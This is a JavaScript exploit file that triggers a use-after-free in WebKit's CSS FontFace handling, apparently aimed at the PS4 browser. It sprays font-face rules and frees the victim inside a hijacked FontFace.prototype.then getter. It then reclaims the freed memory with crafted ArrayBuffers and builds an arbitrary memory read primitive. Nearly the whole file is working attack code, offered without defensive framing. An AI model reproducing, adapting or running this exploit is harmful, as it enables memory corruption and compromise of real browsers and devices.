// userland.js — UAF trigger + read primitive (fixed: does not await load)

const MEMORY_LIMIT_BYTES = 24 * 1024 * 1024;

// ─── Memory helpers ──────────────────────────────────────
function memUsage() {
  if (performance && performance.memory) {
    return {
      used: performance.memory.usedJSHeapSize,
      total: performance.memory.totalJSHeapSize,
      limit: performance.memory.jsHeapSizeLimit,
    };
  }
  return null;
}

function memLog(label) {
  const m = memUsage();
  if (m) {
    logger.debug(
      `[mem:${label}] used=${(m.used / 1048576).toFixed(2)}MB ` +
      `total=${(m.total / 1048576).toFixed(2)}MB ` +
      `cap=${(m.limit / 1048576).toFixed(0)}MB`
    );
  }
}

function assertMemoryHeadroom(extraBytes, stage) {
  const m = memUsage();
  if (!m) return;
  if (m.used + extraBytes > MEMORY_LIMIT_BYTES) {
    throw new Error(
      `OOM guard at ${stage}: ` +
      `used=${(m.used / 1048576).toFixed(2)}MB + ` +
      `need=${(extraBytes / 1048576).toFixed(2)}MB > ` +
      `cap=${(MEMORY_LIMIT_BYTES / 1048576).toFixed(0)}MB`
    );
  }
}

// ─── init_rw ─────────────────────────────────────────────
async function init_rw(opts = {}) {
  const sprayCount    = opts.sprayCount    ?? 0x10;
  const loadTimeoutMs = opts.loadTimeoutMs ?? 2000;

  logger.info(`Initiate UAF (sprayCount=${sprayCount}, timeout=${loadTimeoutMs}ms)`);
  memLog("start");

  // ── Font A: local source, MUST resolve on any WebKit build ──
  // Use "sans-serif" not "Helvetica" — PS4 always has a generic
  // sans-serif mapping; named fonts may not exist.
  const A = new FontFace("a", "local(sans-serif)", { unicodeRange: "U+0041" });
  document.fonts.add(A);
  void A.loaded;

  // ── Style element with spray rules ──
  const style = document.createElement("style");
  document.head.appendChild(style);

  // Both rules use sources that parse without network.
  // The victim (b) will never complete loading — that's intentional.
  const sprayRule =
    `@font-face{font-family:spray;src:local(monospace);unicode-range:U+0043}`;
  const uafRule =
    `@font-face{font-family:b;src:url(nonexistent-font.woff);unicode-range:U+0042}`;

  const half = Math.floor(sprayCount / 2);

  // Spray before victim
  for (let i = 0; i < half; i++) {
    try { style.sheet.insertRule(sprayRule, style.sheet.cssRules.length); }
    catch (e) { throw new Error(`insertRule pre ${i}: ${e.message}`); }
  }

  // Victim
  const uafRuleIndex = style.sheet.cssRules.length;
  try { style.sheet.insertRule(uafRule, style.sheet.cssRules.length); }
  catch (e) { throw new Error(`insertRule victim: ${e.message}`); }

  // Spray after victim
  for (let i = half; i < sprayCount; i++) {
    try { style.sheet.insertRule(sprayRule, style.sheet.cssRules.length); }
    catch (e) { throw new Error(`insertRule post ${i}: ${e.message}`); }
  }

  // ── Force ONE layout so all CSSFontFace objects materialize ──
  // This must happen BEFORE load() starts, so the matchingFaces
  // list in WebKit contains real CSSFontFace instances.
  void document.body.offsetTop;
  logger.debug("[uaf] CSSFontFace objects materialized");

  // ── Getter state ──
  let getterFired = false;
  let getterError = null;
  let getterResolve = null;
  const getterFiredPromise = new Promise(r => { getterResolve = r; });

  // ── Pre-allocate spray slot array ──
  const abs = new Array(sprayCount);
  const abSize = constants.wk_CSSFontFace_sizeof;

  assertMemoryHeadroom(abSize * sprayCount + 4096, "pre-spray");

  // ── Save original then ──
  const origThen = FontFace.prototype.then;

  // ── Free work (runs inside the getter) ──
  const doFreeWork = () => {
    logger.debug("[getter] ENTER");

    // 1. Free victim's rule
    try {
      style.sheet.deleteRule(uafRuleIndex);
      logger.debug("[getter] victim rule deleted");
    } catch (e) {
      logger.error(`[getter] deleteRule victim: ${e.message}`);
    }

    // 2. Free neighbours
    for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
      const rule = style.sheet.cssRules[i];
      if (rule.cssText && rule.cssText.indexOf("spray") !== -1) {
        try { style.sheet.deleteRule(i); } catch (_) {}
      }
    }
    logger.debug("[getter] neighbour rules deleted");

    // 3. Force deconstruction
    void document.body.offsetTop;
    logger.debug("[getter] layout forced");

    // 4. Detach style element
    try { style.remove(); } catch (_) {}
    try { document.head.removeChild(style); } catch (_) {}

    // 5. Spray ArrayBuffers
    let allocated = 0;
    for (let i = 0; i < abs.length; i++) {
      try {
        const ab = new ArrayBuffer(abSize);
        const view = new DataView(ab);

        view.setBInt(8, 1, true);
        view.setUint8(constants.wk_CSSFontFace_m_status, 3);

        if (version.major >= 13) {
          const tagOff = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
          view.setUint8(tagOff, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
          for (let j = 1; j < 8; j++) view.setUint8(tagOff + j, 0);
        }

        abs[i] = ab;
        allocated++;
      } catch (e) {
        getterError = `ArrayBuffer ${i}/${abs.length}: ${e.message}`;
        logger.error(`[getter] ${getterError}`);
        break;
      }
    }
    logger.debug(`[getter] allocated ${allocated}/${abs.length}`);

    // 6. Restore prototype immediately
    try {
      Object.defineProperty(FontFace.prototype, "then", {
        configurable: true,
        value: origThen,
      });
    } catch (_) {}

    logger.debug("[getter] EXIT");
  };

  // ── Install the re-entrant getter ──
  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get() {
      if (this === A && !getterFired) {
        getterFired = true;
        try {
          doFreeWork();
        } catch (e) {
          getterError = e.message;
          logger.error(`[getter] ${e.message}`);
        }
        getterResolve("fired");
        return undefined; // A is not thenable → load() will not await it
      }
      return origThen;
    },
  });

  // ── Start load — DO NOT AWAIT ──
  // The load promise will never settle because B's URL is bogus.
  // We don't care. We only care about whether the getter fires.
  logger.debug("[uaf] calling document.fonts.load (fire-and-forget)");
  document.fonts.load("1em a, b", "AB").catch(() => {});

  // ── Race: getter fires vs timeout ──
  const timeoutPromise = new Promise(r =>
    setTimeout(() => r("timeout"), loadTimeoutMs));

  const raceResult = await Promise.race([getterFiredPromise, timeoutPromise]);
  logger.debug(`[uaf] race result: ${raceResult}, getterFired=${getterFired}`);

  // ── Restore prototype in case getter never fired ──
  if (!getterFired) {
    try {
      Object.defineProperty(FontFace.prototype, "then", {
        configurable: true,
        value: origThen,
      });
    } catch (_) {}
  }

  // ── Diagnose ──
  if (!getterFired) {
    // Log A's status for diagnosis
    let aStatus = "unknown";
    try { aStatus = A.status; } catch (_) {}
    logger.error(`[diag] A.status = ${aStatus}`);
    logger.error(`[diag] A.unicodeRange = ${A.unicodeRange}`);
    logger.error(`[diag] document.fonts.size = ${document.fonts.size}`);
    throw new Error(
      `UAF getter never fired within ${loadTimeoutMs}ms. ` +
      `A.status=${aStatus}. A (local sans-serif) did not resolve, ` +
      `or WebKit bypassed FontFace.prototype.then.`
    );
  }

  if (getterError) {
    throw new Error(`UAF getter error: ${getterError}`);
  }

  memLog("post-uaf");

  // ── Find UAF FontFace ──
  // We can't rely on load() having resolved, so scan document.fonts.
  // The UAF FontFace will report unicodeRange "U+0-10FFFF" (the default),
  // because the CSS rule that set it has been freed.
  let uaf_font = null;
  for (const f of document.fonts) {
    if (f === A) continue;
    try {
      if (f.unicodeRange === "U+0-10FFFF") {
        uaf_font = f;
        break;
      }
    } catch (_) { /* skip broken wrappers */ }
  }

  if (!uaf_font) {
    logger.error(`[diag] document.fonts.size = ${document.fonts.size}`);
    throw new Error("No UAF FontFace found (unicodeRange U+0-10FFFF)");
  }
  logger.info("Found UAF FontFace !!");

  // ── Find aliased ArrayBuffer (refcount 2) ──
  let uaf_ab = null;
  let uaf_ab_index = -1;
  for (let i = 0; i < abs.length; i++) {
    const ab = abs[i];
    if (!ab) continue;
    try {
      const v = new DataView(ab);
      if (v.getBInt(8, true).eq(2)) {
        uaf_ab = ab;
        uaf_ab_index = i;
        break;
      }
    } catch (_) { /* skip */ }
  }

  if (!uaf_ab) {
    throw new Error("Unable to find ArrayBuffer of UAF FontFace !!");
  }
  logger.info(`Found ArrayBuffer of UAF FontFace at index ${uaf_ab_index}`);

  // ── Free everything else ──
  for (let i = 0; i < abs.length; i++) {
    if (i !== uaf_ab_index) abs[i] = null;
  }
  abs.length = 0;

  try { document.fonts.delete(A); } catch (_) {}

  memLog("post-reclaim");

  // ── Read primitive ──
  const self = {
    uaf_ab,
    uaf_font,

    read(addr, size) {
      const ab = new ArrayBuffer(size);
      const u8 = new Uint8Array(ab);
      const uaf_view = new DataView(self.uaf_ab);

      const useWorkaround = version.major >= 13;

      let offset = 0;
      while (offset < size) {
        const ptr = addr.add(offset);

        if (useWorkaround) {
          const tag_off = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
          const pay_off = tag_off + 8;

          uaf_view.setUint8(tag_off, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
          for (let i = 1; i < 8; i++) uaf_view.setUint8(tag_off + i, 0);
          uaf_view.setBInt(pay_off, ptr, true);
        } else {
          uaf_view.setBInt(
            constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true);
          uaf_view.setInt32(
            constants.wk_CSSFontFace_m_featureSettings_m_size, 1, true);
          uaf_view.setInt32(
            constants.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true);
        }

        let chunk = "";
        try {
          chunk = self.uaf_font.featureSettings || "";
        } catch (e) {
          throw new Error(`featureSettings getter threw: ${e.message}`);
        }

        if (chunk.length < 5) {
          throw new Error(
            `featureSettings returned short string: ${JSON.stringify(chunk)} ` +
            `(workaround=${useWorkaround})`
          );
        }

        for (let i = 1; i < 5; i++) {
          u8[offset++] = chunk.charCodeAt(i) & 0xff;
        }
      }

      return ab;
    },

    read8(addr) {
      const ab = self.read(addr, 8);
      return new DataView(ab).getBInt(0, true);
    },

    cleanup() {
      try { document.fonts.clear(); } catch (_) {}
      self.uaf_ab = null;
      self.uaf_font = null;
    },
  };

  return self;
}
